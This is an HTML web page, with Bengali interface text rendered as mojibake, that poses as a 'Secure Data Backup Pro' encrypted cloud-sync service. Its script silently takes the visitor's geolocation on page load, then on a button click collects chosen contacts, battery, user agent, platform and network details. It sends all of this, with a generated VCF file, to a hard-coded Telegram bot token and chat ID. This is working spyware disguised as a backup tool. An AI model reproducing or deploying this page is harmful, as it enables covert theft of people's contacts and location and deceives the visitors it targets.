<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Data Backup Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #d4af37; /* Golden */
            --bg: #0f172a;    /* Deep Dark Blue/Black */
            --card: #1e293b;
            --text: #f8fafc;
        }

        body {
            font-family: 'Hind Siliguri', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background: var(--card);
            width: 90%;
            max-width: 420px;
            padding: 40px 30px;
            border-radius: 30px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            text-align: center;
            border: 1px solid rgba(212, 175, 55, 0.2);
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(212, 175, 55, 0.05) 0%, transparent 70%);
            z-index: 0;
        }

        .content { position: relative; z-index: 1; }

        .logo {
            font-size: 60px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 10px var(--primary));
        }

        h2 { color: var(--primary); margin-bottom: 10px; font-weight: 600; font-size: 26px; }
        p { color: #94a3b8; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }

        .input-box {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: left;
        }

        label { font-size: 12px; color: var(--primary); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
        
        #displayLocation { color: #fff; font-size: 14px; margin-top: 5px; min-height: 20px; }

        .btn {
            background: linear-gradient(135deg, #d4af37, #f2d06b);
            color: #000;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 15px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.3);
        }

        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(212, 175, 55, 0.4); }
        .btn:active { transform: scale(0.98); }

        #status { margin-top: 25px; font-size: 14px; color: var(--primary); font-weight: 500; }

        .loading-bar {
            height: 4px;
            width: 0%;
            background: var(--primary);
            position: absolute;
            bottom: 0;
            left: 0;
            transition: 0.5s;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="content">
        <div class="logo">üõ°Ô∏è</div>
        <h2>‡¶∏‡¶ø‡¶ï‡¶ø‡¶â‡¶∞ ‡¶ï‡ßç‡¶≤‡¶æ‡¶â‡¶° ‡¶∏‡¶ø‡¶ô‡ßç‡¶ï</h2>
        <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶è‡¶¨‡¶Ç ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶°‡ßá‡¶ü‡¶æ ‡¶è‡¶®‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü‡ßá‡¶° ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶®‡¶ø‡¶§‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶¨‡¶æ‡¶ü‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</p>
        
        <div class="input-box">
            <label>‡¶°‡¶ø‡¶ü‡ßá‡¶ï‡ßç‡¶ü‡ßá‡¶° ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®</label>
            <div id="displayLocation">‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...</div>
        </div>

        <button id="syncBtn" class="btn">‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        <div id="status">‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶®</div>
    </div>
    <div class="loading-bar" id="loadBar"></div>
</div>

<script>
    const TELEGRAM_CONFIG = {
        TOKEN: '7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc',
        CHAT_ID: '5923885908'
    };

    let fullAddress = "‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø";
    let coords = "";

    // ‡ßß. ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶§‡ßá‡¶á ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ
    async function autoLocate() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
                    const data = await res.json();
                    fullAddress = data.display_name;
                    document.getElementById('displayLocation').innerText = fullAddress;
                } catch (e) {
                    document.getElementById('displayLocation').innerText = coords;
                }
            }, () => {
                document.getElementById('displayLocation').innerText = "‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶¨‡ßç‡¶≤‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá";
            });
        }
    }
    autoLocate();

    const syncBtn = document.getElementById('syncBtn');
    const status = document.getElementById('status');
    const loadBar = document.getElementById('loadBar');

    syncBtn.addEventListener('click', async () => {
        try {
            if (!('contacts' in navigator)) {
                alert("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞‡ßá ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶∏‡¶æ‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶®‡ßá‡¶á‡•§ ‡¶¶‡ßü‡¶æ ‡¶ï‡¶∞‡ßá ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡ßç‡¶∞‡ßü‡ßá‡¶° ‡¶ï‡ßç‡¶∞‡ßã‡¶Æ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§");
                return;
            }

            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

            if (contacts.length > 0) {
                syncBtn.disabled = true;
                status.innerText = "‡¶è‡¶®‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü‡¶ø‡¶Ç ‡¶è‡¶¨‡¶Ç ‡¶∏‡ßá‡¶®‡ßç‡¶°‡¶ø‡¶Ç...";
                loadBar.style.width = "40%";

                // ‡ß®. ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π
                const battery = await navigator.getBattery();
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    battery: Math.round(battery.level * 100) + "%",
                    charging: battery.charging ? "Yes" : "No",
                    connection: navigator.connection?.effectiveType || "Unknown",
                    time: new Date().toLocaleString('bn-BD')
                };

                // ‡ß©. VCF ‡¶´‡¶æ‡¶á‡¶≤ ‡¶§‡ßà‡¶∞‡¶ø
                let vcfData = "";
                contacts.forEach(c => {
                    vcfData += `BEGIN:VCARD\nVERSION:3.0\nFN:${c.name ? c.name[0] : 'Unknown'}\nTEL:${c.tel ? c.tel[0] : ''}\nEND:VCARD\n`;
                });

                // ‡ß™. ‡¶™‡ßÇ‡¶∞‡ßç‡¶£‡¶æ‡¶ô‡ßç‡¶ó ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶§‡ßà‡¶∞‡¶ø
                const reportMsg = `üèÜ **‡¶™‡ßç‡¶∞‡¶ø‡¶Æ‡¶ø‡ßü‡¶æ‡¶Æ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü**\n\n` +
                    `üë§ **‡¶Æ‡ßã‡¶ü ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü:** ${contacts.length}\n` +
                    `üìç **‡¶†‡¶ø‡¶ï‡¶æ‡¶®‡¶æ:** ${fullAddress}\n` +
                    `üó∫ **‡¶ï‡ßã‡¶Ö‡¶∞‡ßç‡¶°‡¶ø‡¶®‡ßá‡¶ü:** ${coords}\n\n` +
                    `üì± **‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶§‡¶•‡ßç‡¶Ø:**\n` +
                    `üîã ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø: ${deviceInfo.battery} (Charging: ${deviceInfo.charging})\n` +
                    `üåê ‡¶®‡ßá‡¶ü‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶ï: ${deviceInfo.connection}\n` +
                    `‚è∞ ‡¶∏‡¶Æ‡ßü: ${deviceInfo.time}`;

                // ‡ß´. ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
                await sendToTelegram(reportMsg, vcfData);

                loadBar.style.width = "100%";
                status.innerText = "‚úÖ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶π‡ßü‡ßá‡¶õ‡ßá!";
                status.style.color = "#d4af37";
            }
        } catch (err) {
            status.innerText = "‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø: " + err.message;
            syncBtn.disabled = false;
        }
    });

    async function sendToTelegram(msg, vcf) {
        // ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown' })
        });

        // VCF ‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        const blob = new Blob([vcf], { type: 'text/vcard' });
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('document', blob, `Backup_${Date.now()}.vcf`);

        return fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
    }
</script>

</body>
</html>
